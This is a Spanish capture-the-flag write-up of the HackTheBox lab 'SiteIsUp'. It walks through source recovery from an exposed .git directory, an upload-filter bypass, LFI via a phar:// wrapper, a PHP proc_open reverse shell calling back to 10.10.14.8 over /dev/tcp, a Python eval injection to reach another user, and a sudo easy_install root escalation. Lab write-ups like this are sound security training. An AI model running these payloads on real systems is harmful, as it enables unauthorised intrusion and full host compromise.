
![image](https://github.com/user-attachments/assets/b1487d6a-86c6-46d0-9c10-3688187e9fc1)


**Publicado:** 05 de Mayo de 2025   
**Autor:** José Miguel Romero aka x3m1Sec   
**Dificultad:** ⭐ Medium  

## 📝 Descripción

"SiteIsUp" es una máquina Linux de dificultad fácil en HackTheBox que simula un servicio web para verificar si otros sitios están en línea. La vulnerabilidad principal radica en una aplicación web con múltiples fallas de seguridad, incluyendo un repositorio Git expuesto y un LFI (Local File Inclusion) que puede ser aprovechado para conseguir RCE (Remote Code Execution). Para la escalada de privilegios, se abusa de permisos sudo en la herramienta easy_install. Este laboratorio es perfecto para practicar reconocimiento web, análisis de código fuente, bypass de restricciones de subida de archivos y explotación de vulnerabilidades comunes en aplicaciones web.
## 🚀 Metodología

```mermaid
flowchart TD
    A[Reconocimiento Inicial] --> B[Enumeración Web]
    B --> C{Repositorio .git expuesto}
    C --> D[Extracción de código fuente]
    D --> E[Descubrimiento de parámetro de cabecera 'only4dev']
    E --> F[Acceso a funcionalidades ocultas]
    F --> G[Panel administrador]
    F --> H[Función de subida de archivos]
    G --> I[Parámetro page vulnerable a LFI]
    H --> J[Bypass de restricciones de extensión]
    I --> K[Uso de wrapper phar://]
    J --> K
    K --> L[Ejecución de código PHP]
    L --> M[RCE vía proc_open]
    M --> N[Reverse shell como www-data]
    N --> O[Explotación de script Python sin sanitización]
    O --> P[Acceso como usuario developer]
    P --> Q[Extracción de clave SSH]
    Q --> R[Login SSH como developer]
    R --> S[Escalada con sudo en easy_install]
    S --> T[Shell como root]
    T --> U[Captura de flag]
```


## 🔭 Reconocimiento

### Ping para verificación en base a TTL

```bash
ping -c2 10.10.11.177
PING 10.10.11.177 (10.10.11.177) 56(84) bytes of data.
64 bytes from 10.10.11.177: icmp_seq=1 ttl=63 time=49.0 ms
64 bytes from 10.10.11.177: icmp_seq=2 ttl=63 time=48.5 ms

--- 10.10.11.177 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 48.539/48.760/48.982/0.221 ms
```

> 💡 **Nota**: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.

### Escaneo de puertos

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.177 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

### Enumeración de servicios
```bash
nmap -sC -sV -p$ports 10.10.11.177

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
```


![image](https://github.com/user-attachments/assets/cc6054cc-d359-47d8-a140-182a46062487)


<div align="center">

```
10.10.11.177 - siteisup.htb
```

</div>

> ⚠️   Debemos agregar este dominio a nuestro archivo hosts.

```bash
echo "10.10.11.177 siteisup.htb" | sudo tee -a /etc/hosts
```


#### 💉 Probando inyecciones de comandos

Tras probar con diversos payloads para ver si podemos realizar inyección de comandos sobre el parámetro del campo de texto, no muestra un mensaje en el que indica que está detectando un intento de hacking:

```
http://www.google.es; whoami
324234234 || ls
```

![image](https://github.com/user-attachments/assets/087bbc6b-5f5b-409d-b950-6cca48ea4aa3)

#### 🕷️ Fuzzing de vhosts

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://siteisup.htb -H 'Host:FUZZ.siteisup.htb' -fs 1131
```


![image](https://github.com/user-attachments/assets/568da222-ecd4-4030-9d76-ea25ab4273b3)




 ⚠️   Debemos agregar este dominio a nuestro archivo hosts.

```bash
echo "10.10.11.177 dev.siteisup.htb" | sudo tee -a /etc/hosts
```

## 🌐 Enumeración Web

A continuación verificamos que no tenemos permiso para acceder a este recurso.
![image](https://github.com/user-attachments/assets/1ab93905-907d-4f30-98da-7f3c18561e6d)



Realizamos fuzzing de directorios usando feroxbuster

```
feroxbuster -u http://siteisup.htb -r  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --scan-dir-listings -C 403,404
```

Encontramos un directorio .git:

![image](https://github.com/user-attachments/assets/399e6bf6-805d-4237-ab5d-284200eeb809)



A continuación usamos la herramienta git dumper para facilitar la revisión del repositorio de código.

```
git_dumper http://siteisup.htb/dev git-dump
```


Una vez descargado el código, en el fichero changelog encontramos información que podría ser interesante:
![image](https://github.com/user-attachments/assets/c438f18a-1dba-4751-8345-85068c35a4dc)


También hay un parámetro especial "only4dev" que se puede enviar e la cabecera de la petición
![image](https://github.com/user-attachments/assets/df196ea0-fe8b-4420-abdd-1f913f3225f9)


A continuación, hacemos una petición a http://dev.siteisup.htb interceptando con Burp y probamos a añadir este parámetro en la cabecera

```
Special-Dev
only4dev
```


![image](https://github.com/user-attachments/assets/5da60e99-9bf5-49e9-b525-a90b0cd00809)



Podemos usar también la extensión para firefox https://addons.mozilla.org/es-ES/firefox/addon/simple-modify-header/:

![image](https://github.com/user-attachments/assets/5015951b-2db9-4eda-bab4-ba7548a5b3a5)

Al hacer esto descubrimos un enlace al panel de administrador y un botón para la subida de archivos.

![image](https://github.com/user-attachments/assets/5c411c0e-432e-49d1-8cc2-f8f9c04021f8)


En lo que respecta al enlace del panel de administrador, vemos que somos redirigidos a:

http://dev.siteisup.htb/?page=admin

![image](https://github.com/user-attachments/assets/828c8fc9-1480-4f21-9a1d-8b9c5835bb6a)


Echando un vistazo al código fuente de esta sección vemos qué parámetro se acepta en la petición que nos permite apuntar a un recurso aunque se están aplicando ciertos filtros para evitar un posible LFI:

![image](https://github.com/user-attachments/assets/3405c8b8-d709-41de-85b9-4323d4df8ced)



Respecto al botón para la subida de archivos:
![image](https://github.com/user-attachments/assets/44d76fcc-6877-417b-a6e2-73ea75717d48)


Si revisamos el código fuente anteriormente descargado del repositorio .git en checker.php:

![image](https://github.com/user-attachments/assets/a7a4e9b1-bed5-48d1-a574-89e5d5d514a5)


Podemos ver las extensiones para la carga de archivos que están permitidas. También podemos ver que se crea un directorio en  uploads/ obteniendo el timestamp de la hora de la subida y aplicado posteriormente la codificación en md5.

También es importante verifica que el archivo se borra una vez después de subirse.

Comprobamos que el directorio /uploads está vacío: 

![image](https://github.com/user-attachments/assets/20ac5f23-ead3-4841-a3ca-923918b7a01f)

Vamos a intentar subir un archivo php con alguna extensión que permita saltarnos la restricción de extensión, por ejemplo usando la webshell de pentestmonkey y renombándola con extensión .phar:

```
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.phar
```

Verificamos que el fichero se ha subido correctamente y tal como habíamos analizado previamente en el código, sea ha creado un directorio con el timestamp de la fecha codificado en MD5:
![image](https://github.com/user-attachments/assets/f2de992b-6efe-4232-b562-06145fc02b6c)


El problema, es que el enlace al archivo se está borrando después de subirse.

![image](https://github.com/user-attachments/assets/ac3e864a-93a8-453d-a035-790cab504c10)


## 💉 Explotación

Recapitulando, en este punto tenemos por un lado, un parámetro page (http://dev.siteisup.htb/?page=XXX) que nos permite leer archivos desde la raíz y que cuando le pasamos un valor le concatena la extensión .php. Por otro lado, conocemos las extensiones que se están filtrando al intentar subir un archivo.

En este punto la mejor opción sería encapsular nuestro archivo .php dentro de un archivo .zip y leerlo con un wrapper .zip, aunque lo descartamos porque la extensión .zip se está filtrando, así que lo que podemos hacer es comprimirlo con una extensión cualquiera que no se esté filtrando e intentar leer el código .php con un wrapper php. Ejemplo:

Creamos nuestro archivo .php haciendo un phpinfo y de esta forma podemos ver qué funciones están deshabilitadas:

```
mousepad info.php
```

info.php
```php
<?php phpinfo(); ?>
```

```
zip test.pwned info.php
```


Subimos el archivo.

![image](https://github.com/user-attachments/assets/fa0f33f9-977c-4f73-a8ec-5e113a31fbcd)



Usamos el wrapper php en la url con el paámetro page para llamar a nuestra shell

 ⚠️   No Debemos agregar la extensión php a nuestro archivo ya que recordemos que tal como vimos en el código fuente se le está concatenando al final.
 
![image](https://github.com/user-attachments/assets/1e82ed31-5d11-4fef-902b-fa208b71e621)



```
http://dev.siteisup.htb/?page=phar://uploads/92b4ba864769f5ab9b0708c96412332a/test.pwned/info
```

A continuación verificamos las disable_functions:

![image](https://github.com/user-attachments/assets/de932a93-b576-473a-8999-dcfcd970ac27)


Para verificar qué función podemos usar, podemos utilizar la herramienta dfunc-bypasser a la cual podemos pasarle una url con el php.info y te indica de qué función de sistema php puedes abusar para ejecutar comandos:

https://github.com/teambi0s/dfunc-bypasser

Podemos usar la herramienta con el parámetro --file especificando el arhivo info.php. Para ello podemos interceptar la petición con burp y en la respuesta renderizada hacer un copy to file:


![image](https://github.com/user-attachments/assets/30b4dcdc-bc7d-4be2-b205-e952c08ba8cf)


```
dfunc_bypasser --file info.php 
```

![image](https://github.com/user-attachments/assets/9c926934-9389-49fa-8618-b1bd8d6ab636)


La herramienta nos indica que podemos usar proc_open. Para ver cómo usar esta función podemos hacer uso de la documentación oficial:

https://www.php.net/manual/en/function.proc-open.php

Podemos adaptar nuestro archivo .php para que haga uso de esta función y obtener una reverse shell de la siguiente forma:

 reverse shell con proc_open function
```php
<?php  
  
$descriptorspec = [  
  
0 => ["pipe", "r"], // STDIN  
  
1 => ["pipe", "w"], // STDOUT  
  
2 => ["pipe", "w"], // STDERR  
  
];  
  
$command = "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.8/1234 0>&1'";  
  
$process = proc_open($command, $descriptorspec, $pipes);  
  
if (is_resource($process)) {  
  
fclose($pipes[0]); // Close STDIN  
  
fclose($pipes[1]); // Close STDOUT  
  
fclose($pipes[2]); // Close STDERR  
  
proc_close($process);  
  
}  
  
?>
```

Creamos nuestra reverse shell y la encapsulamos con cualquier extensión que no esté filtrada:

```
zip revshell.test shell.php 
```

Tras subirla, iniciamos un listener en el puerto que hayamos especificado volvemos a hacer uso del wrapper para llamarla:

![image](https://github.com/user-attachments/assets/87eea073-eebd-4678-b3c7-31a71c56f538)


```
http://dev.siteisup.htb/?page=phar://uploads/64fbd80378990182b061d4ceca662019/revshell.test/shell
```

![image](https://github.com/user-attachments/assets/7e461168-3b98-460c-a282-5312b0569e54)



Tras ganar acceso, hacemos un full tty de nuestra shell:
```
SHELL=/bin/bash script -q /dev/null
```

Encontramos un script en python sobre el que el usuario www-data tiene permisos de lectura y ejecución:

![image](https://github.com/user-attachments/assets/6a27cd81-fd38-4824-92c2-9ccbee0a48a7)



El script parece que toma la entrada del usuario sin sanitizarla. Podemos abusar de esto pasándo el siguiente parámetro a la función y escalar a developer:
```
./siteisup
__import__('os').system('/bin/bash')
```


![image](https://github.com/user-attachments/assets/fb4ef046-2274-46e0-9150-26e079a5b1ed)


Seguimos sin tener permisos para leer la flag de /home/developer:

![image](https://github.com/user-attachments/assets/c2a8d91a-8979-46b0-966d-6c6999ac7a02)


Dado que sí tenemos permisos para leer el directorio .ssh, vamos a usar la clave ssh para conectarnos:

![image](https://github.com/user-attachments/assets/71e8d822-8228-4e52-8f6f-94d1cbbd1545)


```
chmod 600 id_rsa_developer
ssh -i id_rsa_developer developer@10.10.11.177
```

```
developer@updown:/home$ cd developer
developer@updown:~$ cat user.txt
*****************e96462e932704
```

## 🔐 Escalada de Privilegios

Verificamos posibles archivos que  puede ejecutar developer como root:

![image](https://github.com/user-attachments/assets/6a162272-7275-4579-9e52-1efa09d8d5fb)


Encontramos información sobre este binario y posibles formas de explotación en gtfobins:

https://gtfobins.github.io/gtfobins/easy_install/#sudo

![image](https://github.com/user-attachments/assets/12fb8e81-db7a-4b44-8f2d-0c16ba664351)


![image](https://github.com/user-attachments/assets/cd241ec2-9af5-445f-ae3a-d083471c8fb3)


```
# cd /root
# ls
lib  root.txt  snap
# cat root.txt
********************b74055c0788b423b4a
```
